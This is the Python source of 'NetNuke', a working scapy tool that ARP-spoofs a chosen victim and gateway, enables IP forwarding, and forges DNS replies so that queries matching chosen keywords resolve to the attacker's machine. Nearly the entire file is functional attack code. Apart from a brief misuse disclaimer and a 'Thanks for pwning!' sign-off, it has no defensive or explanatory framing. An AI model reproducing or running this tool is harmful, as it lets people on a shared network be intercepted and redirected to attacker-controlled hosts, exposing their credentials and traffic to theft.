import time,os,subprocess

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from optparse import OptionParser
from scapy.all import *

def init():
  print "                                 _           "
  print "                 _              | |          "
  print "   ____  _____ _| |_ ____  _   _| |  _ _____ "
  print "  |  _ \| ___ (_   _)  _ \| | | | |_/ ) ___ |"
  print "  | | | | ____| | |_| | | | |_| |  _ (| ____|"
  print "  |_| |_|_____)  \__)_| |_|____/|_| \_)_____)"
  print "    by: edwood777 and lassimus\n             "
  print "                                             "
  print "    DISCLAIMER: Authors not responsible      "
  print "    for the potential misuse of this code.   "
  print "\n"
  print ""
  print "Spoofing keywords: {0}".format(', '.join(Spoofwords))
  print "Attacker information for iface: {0}:\n\tIP: {1}\n\tMAC: {2}\n\tGateway IP: {3}".format(interface,attackerIP,attackerMAC,gatewayIP)
  
def spoofArp(attackerMAC,gatewayIP,victimIP):
  
  #Tells victim that attacker is gateway
  pkt = ARP() 
  pkt.hwsrc = attackerMAC
  pkt.psrc = gatewayIP
  pkt.pdst = victimIP
  pkt.op = "is-at"
  send(pkt, verbose = 0)

  #Tells gateway that attacker is victim
  pkt = ARP()
  pkt.hwsrc = attackerMAC
  pkt.psrc = victimIP
  pkt.pdst = gatewayIP
  pkt.op = "is-at"
  send(pkt, verbose = 0)


def filterCheck(packet, Spoofwords):
  for item in Spoofwords:
    if item.lower() in packet['DNS Question Record'].qname: return True
  return False
  
def DNSSpoof(pkt,destIP,Spoofwords):
  ip = pkt[0][IP]; dns = pkt[0][DNS]; querydata = dns.qd
  spoofedPKT = Ether(dst = pkt[0][Ether].src)/IP(src = ip.dst, dst = ip.src)/UDP(sport = ip.dport, dport = ip.sport)/DNS(id = dns.id, z = 0, rd = 1, ra = 1, qr = 1, qdcount = 1, ancount = 1, an = DNSRR(rrname = querydata.qname, rdata = destIP, ttl = 3600, type = 1), qd = querydata)
  if (filterCheck(pkt[0],Spoofwords)):
    sendp(spoofedPKT, verbose = 0, iface = conf.iface)     
    print "[!--] Sent Spoofed DNS {0} to {1}".format(querydata.qname,attackerIP)
  else: print "[!] " + ip.src + " wants " + querydata.qname #displays all dns requests   

def ifconfigParse(iface):
  out = subprocess.check_output(['ifconfig',iface])
  mac = out[out.find('HWaddr')+7:out.find('HWaddr')+24]
  iptmp = out[out.find('inet addr:')+10:out.find('inet addr:')+25]
  #remove extra characters since ip string is not always 15 chars
  attackerIP = ''
  for c in iptmp:
    if c == ' ':  break
    else: attackerIP+=c

  tmp = subprocess.check_output(['netstat','-rn'])
  startpoint = tmp.find('0.0.0.0         '+attackerIP[:-3])+16
  tmp = tmp[startpoint:startpoint+15]
  gatewayIP = ''.join(tmp.split(' '))

  return attackerIP, mac, gatewayIP

def main(interface,attackerIP,attackerMAC,gatewayIP,victimIP,Spoofwords):
  conf.iface=interface
  spoofArp(attackerMAC,gatewayIP,victimIP)
  print "[+] ARP spoof initiated."
  while 1:
    try:

      
      # sniffs until it recieves 1 DNS or ARP packet
      # filter does kernel level filtering for speed
      # lfilter applies a funtion to the packet to decide whether or not to take action
      # count receives only 1 packet
       
      pkt = sniff(iface = conf.iface,filter = '(udp port 53) or arp', count = 1)

      if (DNS in pkt[0] and (pkt[0][DNS].opcode == 0L and pkt[0][DNS].ancount == 0 and pkt[0][IP].src != attackerIP)):
        DNSSpoof(pkt,attackerIP,Spoofwords)

      if (ARP in pkt[0]):
        spoofArp(attackerMAC,gatewayIP,victimIP)
        print "[+] ARP spoof update: You're still in charge!" #Whenever an arp packet is sniffed, we re-spoof
      # if pkt is a dns request
    except IndexError,KeyboardInterrupt:
      exit("\nGoodbye! Thanks for pwning!")


if __name__ == '__main__':
  
  if os.geteuid():  exit('NetNuke must be run with root.')

  usage = "usage: %prog [options] [filter1] [filter1] ... [filtern]"
  parser = OptionParser(usage=usage)
  parser.add_option("-v","--victim",dest="victim", help = "Victim IP Address")
  parser.add_option("-i","--interface",dest="iface", help = "Interface to Nuke from. Default is eth0",default='eth0')
  parser.add_option("-g","--gateway",help = "Override Gateway IP to Nuke. Should generally be left blank",default=None)
  (options,args) = parser.parse_args()

  if len(args)==0:
    print parser.usage
    exit()

  interface = options.iface
  attackerIP,attackerMAC,gatewayIP = ifconfigParse(interface)
  if options.gateway: gatewayIP = options.gateway
  victimIP= options.victim
  Spoofwords = args
  
  os.system('sysctl -w net.ipv4.ip_forward=1') #allows ARP spoofed traffic to pass through to the internet.
  os.system("clear")
  
  init() 
  main(interface,attackerIP,attackerMAC,gatewayIP,victimIP,Spoofwords)


